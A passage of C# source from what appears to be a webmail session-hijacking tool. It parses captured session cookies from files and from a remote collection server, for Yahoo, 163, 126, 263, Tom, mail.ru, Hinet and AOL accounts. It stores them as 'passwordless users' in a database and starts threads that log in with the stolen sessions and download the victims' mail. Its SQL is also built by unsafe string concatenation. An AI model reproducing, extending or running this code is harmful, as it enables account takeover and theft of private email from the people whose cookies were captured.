                                    this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                                    continue;
                                }
                            }
                        }
                    }
                    if ((message == "") || (str5 == ""))
                    {
                        this.listBoxView.Items.Add("转换失败！");
                        this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                    }
                    else
                    {
                        this.listBoxView.Items.Add("转换成功！");
                        CookieInfos cookieInfo = new CookieInfos();
                        cookieInfo.mailCookieType = "163";
                        cookieInfo.mailCookieUrl = str5;
                        cookieInfo.cookieTxx = message;
                        cookieInfo.nowTime = now.ToString();
                        cookieInfo.UserList = this.UserList;
                        cookieInfo.Auto = Auto;
                        cookieInfo.cookieRemarks = cookieRemarks;
                        try
                        {
                            if (!this.EnqueueCookie(cookieInfo))
                            {
                                this.listBoxView.Items.Add("添加cookie失败:");
                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            }
                            continue;
                        }
                        catch
                        {
                            this.listBoxView.Items.Add("写入cookie失败:");
                            this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            continue;
                        }
                    }
                }
            }
            reader.Close();
            this.ThreadCookies = this.MaxThreads;
        }

        public void mail263_txt(string yahoo_txtPath, bool Auto, string cookieRemarks)
        {
            string strCookie = "";
            string str2 = "";
            int index = 0;
            int num2 = 0;
            string s = "";
            DateTime now = DateTime.Now;
            string str4 = "";
            StreamReader reader = new StreamReader(yahoo_txtPath, Encoding.Default);
            while ((strCookie = reader.ReadLine()) != null)
            {
                if (strCookie.Length > 0x19)
                {
                    index = strCookie.IndexOf("DATE:");
                    if (index != -1)
                    {
                        num2 = strCookie.IndexOf("URL:");
                        if (num2 != -1)
                        {
                            s = strCookie.Substring(index + 5, num2 - (index + 5)).Trim();
                            if (s != "")
                            {
                                now = DateTime.Parse(s);
                            }
                            index = strCookie.IndexOf("Cookies:");
                            if (index != -1)
                            {
                                str4 = strCookie.Substring(num2 + 4, index - (num2 + 4)).Trim();
                                if (str4.Length == 0)
                                {
                                    this.listBoxView.Items.Add("Url不正确请检查");
                                    this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                                    continue;
                                }
                                strCookie = strCookie.Substring(index + 8, strCookie.Length - (index + 8));
                            }
                        }
                        else
                        {
                            this.listBoxView.Items.Add("Url不正确请检查");
                            this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                        }
                    }
                    if ((str4 != "") && (str4 != null))
                    {
                        str2 = this.get263Cookie(strCookie);
                        if (str2 == "")
                        {
                            this.listBoxView.Items.Add("转换失败！");
                            this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                        }
                        else
                        {
                            this.listBoxView.Items.Add("转换成功！");
                            CookieInfos cookieInfo = new CookieInfos();
                            cookieInfo.mailCookieType = "263";
                            cookieInfo.mailCookieUrl = str4;
                            cookieInfo.cookieTxx = str2;
                            cookieInfo.nowTime = now.ToString();
                            cookieInfo.UserList = this.UserList;
                            cookieInfo.Auto = Auto;
                            cookieInfo.cookieRemarks = cookieRemarks;
                            try
                            {
                                if (!this.EnqueueCookie(cookieInfo))
                                {
                                    this.listBoxView.Items.Add("添加cookie失败:");
                                    this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                                }
                                continue;
                            }
                            catch
                            {
                                this.listBoxView.Items.Add("写入cookie失败:");
                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                                continue;
                            }
                        }
                    }
                }
            }
            reader.Close();
            this.ThreadCookies = this.MaxThreads;
        }

        private string get263Cookie(string strCookie)
        {
            string str = "";
            string str2 = "";
            strCookie = " " + strCookie + "; ";
            str = this.putstr(strCookie, " cid=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "cid=" + str + " ";
            }
            str = this.putstr(strCookie, " newm=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "newm=" + str + " ";
            }
            return str2;
        }

        public void tommail_txt(string tom_txtPath, bool Auto, string cookieRemarks)
        {
            string strCookie = "";
            string message = "";
            int index = 0;
            int num2 = 0;
            string s = "";
            DateTime now = DateTime.Now;
            string str5 = "";
            StreamReader reader = new StreamReader(tom_txtPath, Encoding.Default);
            while ((strCookie = reader.ReadLine()) != null)
            {
                if (strCookie.Length > 0x19)
                {
                    index = strCookie.IndexOf("DATE:");
                    if (index != -1)
                    {
                        num2 = strCookie.IndexOf("URL");
                        if (num2 != -1)
                        {
                            s = strCookie.Substring(index + 5, num2 - (index + 5)).Trim();
                            if (s != "")
                            {
                                now = DateTime.Parse(s);
                            }
                            index = strCookie.IndexOf("Cookies:");
                            if (index != -1)
                            {
                                str5 = strCookie.Substring(num2 + 4, index - (num2 + 4)).Trim();
                                strCookie = strCookie.Substring(index + 8, strCookie.Length - (index + 8)).Trim();
                            }
                        }
                    }
                    string str6 = "";
                    message = this.gettomMailCookieCoremail(strCookie);
                    if (message != "")
                    {
                        str6 = this.putstr(message, "Coremail=", " ", 0);
                        if (str6 != "-1")
                        {
                            str6 = this.putstr(str6, "%", ";", 0);
                            if (str6 != "-1")
                            {
                                string str7 = "";
                                str7 = this.gettomutmcsr(strCookie);
                                if (str7 != "")
                                {
                                    str7 = str7.Trim(new char[] { ';' });
                                    str5 = "http://bjapp6." + str7 + "/cgi/loadpage?sid=" + str6 + "&listpage=top.htm";
                                }
                                else
                                {
                                    str5 = "http://bjapp6.mail.tom.com/cgi/loadpage?sid=" + str6 + "&listpage=top.htm";
                                }
                            }
                            else
                            {
                                this.listBoxView.Items.Add("缺少必须的Cookie");
                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                                continue;
                            }
                        }
                    }
                    if ((message == "") || (str5 == ""))
                    {
                        this.listBoxView.Items.Add("转换失败！");
                        this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                    }
                    else
                    {
                        this.listBoxView.Items.Add("转换成功！");
                        CookieInfos cookieInfo = new CookieInfos();
                        cookieInfo.mailCookieType = "TOMMAIL";
                        cookieInfo.mailCookieUrl = str5;
                        cookieInfo.cookieTxx = message;
                        cookieInfo.nowTime = now.ToString();
                        cookieInfo.UserList = this.UserList;
                        cookieInfo.Auto = Auto;
                        cookieInfo.cookieRemarks = cookieRemarks;
                        try
                        {
                            if (!this.EnqueueCookie(cookieInfo))
                            {
                                this.listBoxView.Items.Add("添加cookie失败:");
                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            }
                            continue;
                        }
                        catch
                        {
                            this.listBoxView.Items.Add("写入cookie失败:");
                            this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            continue;
                        }
                    }
                }
            }
            reader.Close();
            this.ThreadCookies = this.MaxThreads;
        }

        private string gettomMailCookieCoremail(string strCookie)
        {
            string str = "";
            string str2 = "";
            strCookie = " " + strCookie + "; ";
            str = this.putstr(strCookie, " Coremail=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "Coremail=" + str + " ";
            }
            return str2;
        }

        private string gettomutmcsr(string strCookie)
        {
            string str = "";
            string str2 = "";
            strCookie = " " + strCookie + "; ";
            str = this.putstr(strCookie, "utmcsr=", "|utmccn", 0);
            if (str != "-1")
            {
                str2 = str;
            }
            return str2;
        }

        public void yahoo_txt(string yahoo_txtPath, bool Auto, string cookieRemarks)
        {
            string strCookie = "";
            string str2 = "MISS";
            string str3 = "";
            int startIndex = 0;
            int index = 0;
            int num3 = 0;
            string s = "";
            DateTime now = DateTime.Now;
            StreamReader reader = new StreamReader(yahoo_txtPath, Encoding.Default);
            while ((strCookie = reader.ReadLine()) != null)
            {
                now = now.AddSeconds(1.0);
                if (strCookie.Length > 0x19)
                {
                    startIndex = strCookie.IndexOf("YM.LC=");
                    if (startIndex >= 0)
                    {
                        str2 = strCookie.Substring(startIndex, strCookie.Length - startIndex);
                        startIndex = str2.IndexOf(";");
                        if (startIndex >= 0)
                        {
                            str2 = str2.Substring(0, startIndex);
                            startIndex = str2.IndexOf("&u=");
                            if (startIndex > 0)
                            {
                                str2 = str2.Substring(startIndex + 3, str2.Length - (startIndex + 3));
                            }
                        }
                    }
                    index = strCookie.IndexOf("DATE:");
                    if (index != -1)
                    {
                        num3 = strCookie.IndexOf("URL:");
                        if (num3 != -1)
                        {
                            s = strCookie.Substring(index + 5, num3 - (index + 5)).Trim();
                            if (s != "")
                            {
                                now = DateTime.Parse(s);
                            }
                            index = strCookie.IndexOf("Cookies:");
                            if (index != -1)
                            {
                                strCookie = strCookie.Substring(index + 8, strCookie.Length - (index + 8));
                            }
                        }
                    }
                    str3 = this.getYCookie(strCookie);
                    if (str3 == "")
                    {
                        this.listBoxView.Items.Add("转换失败！");
                        this.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                    }
                    else
                    {
                        this.listBoxView.Items.Add("转换成功！");
                        CookieInfos cookieInfo = new CookieInfos();
                        cookieInfo.mailCookieType = "YAHOOMAIL";
                        cookieInfo.mailCookieUrl = "mail.yahoo.com";
                        cookieInfo.cookieTxx = str3;
                        cookieInfo.nowTime = now.ToString();
                        cookieInfo.UserList = this.UserList;
                        cookieInfo.Auto = Auto;
                        cookieInfo.cookieRemarks = cookieRemarks;
                        try
                        {
                            if (!this.EnqueueCookie(cookieInfo))
                            {
                                this.listBoxView.Items.Add("添加cookie失败:");
                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            }
                            continue;
                        }
                        catch
                        {
                            this.listBoxView.Items.Add("写入cookie失败:");
                            this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            continue;
                        }
                    }
                }
            }
            reader.Close();
            this.ThreadCookies = this.MaxThreads;
        }

        private string getYCookie(string strCookie)
        {
            string str = "";
            string str2 = "";
            strCookie = " " + strCookie + "; ";
            str = this.putstr(strCookie, " B=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "B=" + str + " ";
            }
            str = this.putstr(strCookie, " F=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "F=" + str + " ";
            }
            str = this.putstr(strCookie, " Y=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "Y=" + str + " ";
            }
            str = this.putstr(strCookie, " T=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "T=" + str + " ";
            }
            return str2;
        }

        public void yahooJapan_txt(string yahoo_txtPath, bool Auto, string cookieRemarks)
        {
            string strCookie = "";
            string str2 = "MISS";
            string str3 = "";
            int startIndex = 0;
            int index = 0;
            int num3 = 0;
            string s = "";
            DateTime now = DateTime.Now;
            StreamReader reader = new StreamReader(yahoo_txtPath, Encoding.Default);
            while ((strCookie = reader.ReadLine()) != null)
            {
                now = now.AddSeconds(1.0);
                if (strCookie.Length > 0x19)
                {
                    startIndex = strCookie.IndexOf("YM.LC=");
                    if (startIndex >= 0)
                    {
                        str2 = strCookie.Substring(startIndex, strCookie.Length - startIndex);
                        startIndex = str2.IndexOf(";");
                        if (startIndex >= 0)
                        {
                            str2 = str2.Substring(0, startIndex);
                            startIndex = str2.IndexOf("&u=");
                            if (startIndex > 0)
                            {
                                str2 = str2.Substring(startIndex + 3, str2.Length - (startIndex + 3));
                            }
                        }
                    }
                    index = strCookie.IndexOf("DATE:");
                    if (index != -1)
                    {
                        num3 = strCookie.IndexOf("URL:");
                        if (num3 != -1)
                        {
                            s = strCookie.Substring(index + 5, num3 - (index + 5)).Trim();
                            if (s != "")
                            {
                                now = DateTime.Parse(s);
                            }
                            index = strCookie.IndexOf("Cookies:");
                            if (index != -1)
                            {
                                strCookie = strCookie.Substring(index + 8, strCookie.Length - (index + 8));
                            }
                        }
                    }
                    str3 = this.getYCookie(strCookie);
                    if (str3 == "")
                    {
                        this.listBoxView.Items.Add("转换失败！");
                        this.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                    }
                    else
                    {
                        this.listBoxView.Items.Add("转换成功！");
                        CookieInfos cookieInfo = new CookieInfos();
                        cookieInfo.mailCookieType = "YAHOOMAIL";
                        cookieInfo.mailCookieUrl = "mail.yahoo.co.jp";
                        cookieInfo.cookieTxx = str3;
                        cookieInfo.nowTime = now.ToString();
                        cookieInfo.UserList = this.UserList;
                        cookieInfo.Auto = Auto;
                        cookieInfo.cookieRemarks = cookieRemarks;
                        try
                        {
                            if (!this.EnqueueCookie(cookieInfo))
                            {
                                this.listBoxView.Items.Add("添加cookie失败:");
                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            }
                            continue;
                        }
                        catch
                        {
                            this.listBoxView.Items.Add("写入cookie失败:");
                            this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            continue;
                        }
                    }
                }
            }
            reader.Close();
            this.ThreadCookies = this.MaxThreads;
        }
        public void ru_txt(string yahoo_txtPath, bool Auto, string cookieRemarks)
        {
            string strCookie = "";
            string str2 = "";
            int index = 0;
            int num2 = 0;
            string s = "";
            DateTime now = DateTime.Now;
            StreamReader reader = new StreamReader(yahoo_txtPath, Encoding.Default);
            while ((strCookie = reader.ReadLine()) != null)
            {
                if (strCookie.Length > 0x19)
                {
                    index = strCookie.IndexOf("DATE:");
                    if (index != -1)
                    {
                        num2 = strCookie.IndexOf("URL:");
                        if (num2 != -1)
                        {
                            s = strCookie.Substring(index + 5, num2 - (index + 5)).Trim();
                            if (s != "")
                            {
                                now = DateTime.Parse(s);
                            }
                            index = strCookie.IndexOf("Cookies:");
                            if (index != -1)
                            {
                                strCookie = strCookie.Substring(index + 8, strCookie.Length - (index + 8));
                            }
                        }
                    }
                    str2 = this.getRuCookie(strCookie);
                    if (str2 == "")
                    {
                        this.listBoxView.Items.Add("转换失败！");
                        this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                    }
                    else
                    {
                        this.listBoxView.Items.Add("转换成功！");
                        CookieInfos cookieInfo = new CookieInfos();
                        cookieInfo.mailCookieType = "RU";
                        cookieInfo.mailCookieUrl = "http://win.mail.ru/cgi-bin/start";
                        cookieInfo.cookieTxx = str2;
                        cookieInfo.nowTime = now.ToString();
                        cookieInfo.UserList = this.UserList;
                        cookieInfo.Auto = Auto;
                        cookieInfo.cookieRemarks = cookieRemarks;
                        try
                        {
                            if (!this.EnqueueCookie(cookieInfo))
                            {
                                this.listBoxView.Items.Add("添加cookie失败:");
                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            }
                            continue;
                        }
                        catch
                        {
                            this.listBoxView.Items.Add("写入cookie失败:");
                            this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            continue;
                        }
                    }
                }
            }
            reader.Close();
            this.ThreadCookies = this.MaxThreads;
        }

        private string getRuCookie(string strCookie)
        {
            string str = "";
            string str2 = "";
            strCookie = " " + strCookie + "; ";
            str = this.putstr(strCookie, " Mpop=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "Mpop=" + str + " ";
            }
            return str2;
        }

        private void 自动获取CookieToolStripMenuItem_CheckStateChanged(object sender, EventArgs e)
        {
            if (this.自动获取CookieToolStripMenuItem.CheckState == CheckState.Checked)
            {
                try
                {
                    this.timerGetCookiesAuto.Enabled = true;
                    this.timerGetCookiesAuto.Interval = 0xea60 * Convert.ToInt32(this.CookieTime);
                }
                catch (Exception exception)
                {
                    MessageBox.Show(exception.Message, "错误");
                }
            }
            else
            {
                this.timerGetCookiesAuto.Enabled = false;
            }

        }

        private void timerGetCookiesAuto_Tick(object sender, EventArgs e)
        {
            new Thread(new ThreadStart(this.getCookies)).Start();
        }

        private void getCookies()
        {
            string url = "";
            string str2 = "";
            string passWord = "";
            string str4 = "";
            string code = "";
            string str6 = "";
            string username = "";
            string str8 = "";
            string strCookie = "";
            string s = "";
            string str11 = "";
            string usertype = "'无密用户'";
            string str13 = "'capY'";
            string str14 = "";
            string emailuri = "";
            string str16 = "'/'";
            string str17 = "";
            string str18 = "1";
            string message = "";
            string str20 = "";
            try
            {
                CookieRecv recv = new CookieRecv();
                url = this.CookieUrl;
                str2 = this.CookieUrl.Replace("mailcookie.asp", "mailID.asp").Replace("mailcookie.php", "mailID.php");
                passWord = "password=" + recv.EncodeBase64("GB2312", this.CookiePassWord);
                code = recv.GetCookie(url, passWord);
                if (code.Length > 0)
                {
                    if (code.Trim() == "Password Error")
                    {
                        MailStr str21 = new MailStr();
                        str21.ShowMessage("警告:密码错误!");
                        str21 = null;
                    }
                    else
                    {
                        code = recv.DecodeBase64("GB2312", code);
                        if (code.Length > 1)
                        {
                            str6 = this.putstr(code, "ID:", "User:", 0).Trim();
                            username = this.putstr(code, "User:", "URL:", 0).Trim();
                            if (username.IndexOf("<") != -1)
                            {
                                username = username.Substring(0, username.IndexOf("<"));
                            }
                            str8 = this.putstr(code, "URL:", "Cookie:", 0).Trim();
                            strCookie = this.putstr(code, "Cookie:", "Time:", 0).Trim();
                            s = this.putstr(code, "Time:", "Ip:", 0).Trim();
                            if (code.IndexOf("Ip:") != -1)
                            {
                                str11 = code.Substring(code.IndexOf("Ip:") + 3, code.Length - (code.IndexOf("Ip:") + 3)).Trim();
                            }
                            str4 = passWord + "&ID=" + str6;
                            if (((((str6 != "-1") && (username != "-1")) && ((str8 != "-1") && (strCookie != "-1"))) && (((s != "-1") && (str11 != "-1")) && ((str6 != "") && (username != "")))) && (((str8 != "") && (strCookie != "")) && ((s != "") && (str11 != ""))))
                            {
                                try
                                {
                                    str17 = DateTime.Parse(s).ToString();
                                }
                                catch (Exception)
                                {
                                    DateTimeFormatInfo provider = new DateTimeFormatInfo();
                                    provider.ShortDatePattern = "dd.MM.yyyy hh:mm:ss";
                                    str17 = DateTime.Parse(s, provider).ToString();
                                }
                                str17 = "'" + str17 + "'";
                                if (((username.IndexOf("@yahoo") != -1) || (username.IndexOf("@ymail") != -1)) || (username.IndexOf("@rocketmail.com") != -1))
                                {
                                    str16 = "'Y'";
                                    if (username.IndexOf("@yahoo.co.jp") != -1)
                                    {
                                        emailuri = "http://mail.yahoo.co.jp/";
                                    }
                                    else
                                    {
                                        emailuri = "http://mail.yahoo.com/";
                                    }
                                    strCookie = this.getYCookie(strCookie);
                                    if (strCookie == "")
                                    {
                                        str16 = "";
                                        recv.GetCookie(str2, str4);
                                    }
                                }
                                else if (username.IndexOf("@163.com") != -1)
                                {
                                    str16 = "'163'";
                                    str20 = this.get163MailCookieCoremailNETEASE_SSN(strCookie);
                                    if (str20 != "")
                                    {
                                        message = this.putstr(str20, "Coremail=", " ", 0);
                                        if ((message != "-1") && (message.IndexOf("%") != -1))
                                        {
                                            message = this.putstr(message, "%", ";", 0);
                                            if (message != "-1")
                                            {
                                                string str22 = "";
                                                str22 = this.get163wmsvr_domain(strCookie);
                                                if (str22 != "")
                                                {
                                                    str22 = str22.Trim(new char[] { ';' });
                                                    emailuri = "http://" + str22 + "/js3/index.jsp?sid=" + message;
                                                }
                                                else
                                                {
                                                    emailuri = "http://mail.163.com/js3/index.jsp?sid=" + message;
                                                }
                                            }
                                            else
                                            {
                                                this.listBoxView.Items.Add(username + "163缺少必须的Cookie");
                                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                                            }
                                        }
                                    }
                                    else
                                    {
                                        str16 = "";
                                        recv.GetCookie(str2, str4);
                                    }
                                }
                                else if (username.IndexOf("@126.com") != -1)
                                {
                                    str16 = "'126'";
                                    str20 = this.get163MailCookieCoremailNETEASE_SSN(strCookie);
                                    if (str20 != "")
                                    {
                                        message = this.putstr(str20, "Coremail=", " ", 0);
                                        if ((message != "-1") && (message.IndexOf("%") != -1))
                                        {
                                            message = this.putstr(message, "%", ";", 0);
                                            if (message != "-1")
                                            {
                                                string str23 = "";
                                                str23 = this.get163wmsvr_domain(strCookie);
                                                if (str23 != "")
                                                {
                                                    str23 = str23.Trim(new char[] { ';' });
                                                    emailuri = "http://" + str23 + "/a/j/dm3/index.jsp?sid=" + message;
                                                }
                                                else
                                                {
                                                    emailuri = "http://mail.126.com/a/j/dm3/index.jsp?sid=" + message;
                                                }
                                            }
                                            else
                                            {
                                                this.listBoxView.Items.Add(username + "126缺少必须的Cookie");
                                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                                            }
                                        }
                                    }
                                    else
                                    {
                                        str16 = "";
                                        recv.GetCookie(str2, str4);
                                    }
                                }
                                else if (username.IndexOf("hinet") != -1)
                                {
                                    str16 = "'HN'";
                                    emailuri = str8;
                                    strCookie = this.getHinetCookie(strCookie);
                                }
                                else if (((username.IndexOf("hotmail") != -1) || (username.IndexOf("msn") != -1)) || (username.IndexOf("live") != -1))
                                {
                                    str16 = "'H'";
                                    code = recv.GetCookie(str2, str4);
                                }
                                else if (username.IndexOf("ru") != -1)
                                {
                                    str16 = "'RU'";
                                    emailuri = "http://win.mail.ru/cgi-bin/start";
                                    strCookie = this.getRuCookie(strCookie);
                                }
                                else if (username.IndexOf("@aol.com") != -1)
                                {
                                    str16 = "'AOL'";
                                    emailuri = "http://webmail.aol.com/31650-111/aol-1/en-us/common/settings.js.aspx";
                                }
                                else if (username.IndexOf("@tom.com") != -1)
                                {
                                    str16 = "'TomMail'";
                                    string str24 = this.putstr(strCookie, "Coremail=", ";", 0);
                                    str24 = str24.Substring(str24.LastIndexOf("%") + 1, (str24.Length - str24.LastIndexOf("%")) - 1);
                                    emailuri = "http://bjapp2.mail.tom.com/cgi/ldapapp?funcid=main&sid=" + str24;
                                }
                                if ((str16.Trim(new char[] { '\'' }) != "H") && (str16.Trim(new char[] { '\'' }) != ""))
                                {
                                    string str25 = "'" + username + "'";
                                    string str26 = "'" + strCookie + "'";
                                    string str27 = "'是'";
                                    str13 = "'" + DateTime.Now.ToString("yyyMMdd") + "'";
                                    str18 = "'" + str18 + "'";
                                    str14 = "'" + this.CookieUserlist + "'";
                                    string strSql = "insert into users(属主,用户名,服务器,服务器地址,方向,邮件地址,验证登陆,时间限制,用户类型,全部接收,用户列表,自动收取) values(" + str13 + "," + str25 + "," + str16 + "," + str16 + ",'capY','" + emailuri + "'," + str26 + "," + str17 + "," + usertype + "," + str27 + "," + str14 + "," + str18 + ")";
                                    string str29 = "select count(*)from users where 服务器地址=" + str16 + "and 用户名=" + str25 + "and 用户类型=" + usertype;
                                    string str30 = "update users set 邮件地址='" + emailuri + "',验证登陆=" + str26 + ",时间限制=" + str17 + " where 服务器地址=" + str16 + "and 用户名=" + str25 + "and 用户类型=" + usertype;
                                    if (Convert.ToInt32(GlobalValue.mainForm.ExecuteSQL(str29)) > 0)
                                    {
                                        int num;
                                        try
                                        {
                                            str29 = "select 时间限制 from users where 服务器地址=" + str16 + "and 用户名=" + str25 + "and 用户类型=" + usertype;
                                            DateTime time3 = DateTime.Parse(GlobalValue.mainForm.ExecuteSQL(str29));
                                            num = DateTime.Compare(DateTime.Parse(s), time3);
                                        }
                                        catch (Exception)
                                        {
                                            num = 1;
                                        }
                                        if (num > 0)
                                        {
                                            this.ExecuteSQL(str30);
                                            this.listBoxView.Items.Add("[" + username + "]:修改用户!");
                                            try
                                            {
                                               // this.playerMp3();//Sound
                                            }
                                            catch (Exception)
                                            {
                                            }
                                            this.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                                            code = recv.GetCookie(str2, str4);
                                            MailStr str32 = new MailStr();
                                            str32.ShowMessage(code);
                                            str32 = null;
                                            foreach (TreeNode node in GlobalValue.mainForm.treeViewUsers.Nodes[0].Nodes)
                                            {
                                                if (node.Text == this.CookieUserlist)
                                                {
                                                    GlobalValue.mainForm.treeViewUsers.SelectedNode = node;
                                                }
                                            }
                                            new BeginReceiveThreads(1, str16.Trim(new char[] { '\'' }), str16.Trim(new char[] { '\'' }), username, "", str13.Trim(new char[] { '\'' }), "capY", 0, emailuri, strCookie, usertype, str14.Trim(new char[] { '\'' })).Execute();
                                        }
                                    }
                                    else
                                    {
                                        this.ExecuteSQL(strSql);
                                        this.listBoxView.Items.Add("添加用户:" + username);
                                        try
                                        {
                                          //  this.playerMp3();  //Sound
                                        }
                                        catch (Exception)
                                        {
                                        }
                                        code = recv.GetCookie(str2, str4);
                                        this.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                                        foreach (TreeNode node2 in GlobalValue.mainForm.treeViewUsers.Nodes[0].Nodes)
                                        {
                                            if (node2.Text == this.CookieUserlist)
                                            {
                                                this.treeViewUsers.SelectedNode = node2;
                                            }
                                        }
                                        new BeginReceiveThreads(1, str16.Trim(new char[] { '\'' }), str16.Trim(new char[] { '\'' }), username, "", str13.Trim(new char[] { '\'' }), "capY", 0, emailuri, strCookie, usertype, str14.Trim(new char[] { '\'' })).Execute();
                                    }
                                }
                            }
                            else if (!(code.Trim() == "ID: User: URL: Cookie: Time: Ip:"))
                            {
                                code = recv.GetCookie(str2, str4);
                            }
                        }
                    }
                }
            }
            catch (Exception exception)
            {
                new MailStr().ShowMessage(code + exception.Message);
            }
        }

        private string getHinetCookie(string strCookie)
        {
            string str = "";
            string str2 = "";
            strCookie = " " + strCookie + "; ";
            str = this.putstr(strCookie, " JSESSIONID=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "JSESSIONID=" + str + " ";
            }
            if (this.putstr(strCookie, " Latest=", " ", 0) != "-1")
            {
                str2 = str2 + "Latest=x%D5%D7%E5%E2%DD%CF%CD; ";
            }
            str = this.putstr(strCookie, " U=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "U=" + str + " ";
            }
            str = this.putstr(strCookie, " S=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "S=" + str + " ";
            }
            str = this.putstr(strCookie, " T=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "T=" + str + " ";
            }
            str = this.putstr(strCookie, " N=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "N=" + str + " ";
            }
            str = this.putstr(strCookie, " D=", ";", 0);
            if (str != "-1")
            {
                str = str.Replace(" ", "+");
                str2 = str2 + "D=" + str + "; ";
            }
            return str2;
        }

        private void CookieMailControl_Load(object sender, EventArgs e)
        {
            this.EmailDateTime = DateTime.Now.AddYears(-50);
            this.ThreadCounts = 5;
            this.ThreadRunning = true;

            if (this.ConnectMdb())
            {
                this.oleDbConnection.Open();
                string str = "0";
                string strSql = "update users set 接收状态=" + str;
               // this.ExecuteSQL(strSql);
                this.oleDbDataAdapterView.Fill(this.cookieMailData.users);
           //   this.LastTimeLogin();
            //  this.statusBarPanelLastLoginText.Text = str2;
                this.statusBarPanelLoginFailText.Text = "0";
                this.statusBarPanelThreadsText.Text = "0";
                this.statusBarPanelEmailNumbersText.Text = "0";
                try
                {
                    strSql = "select * from 163mailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE 163mailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(10),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from 126mailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE 126mailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(10),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from 263mailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE 263mailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(10),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from TomMailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE TomMailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(10),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from SinaMailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE SinaMailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(10),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from 21CNMailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE 21CNMailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(10),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from AolmailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE AolmailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(50),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from FastmailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE FastmailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(50),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from UsersList";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE UsersList([ListID] AUTOINCREMENT,[UsersListName] text(255),PRIMARY KEY ([ListID]));";
                    this.ExecuteSQL(strSql);
                    strSql = "insert into UsersList(UsersListName) values('默认用户列表')";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select count(用户列表) from users";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "alter table users add 用户列表 memo";
                    this.ExecuteSQL(strSql);
                    strSql = "update  users set 用户列表='默认用户列表'";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select count(自动收取) from users";
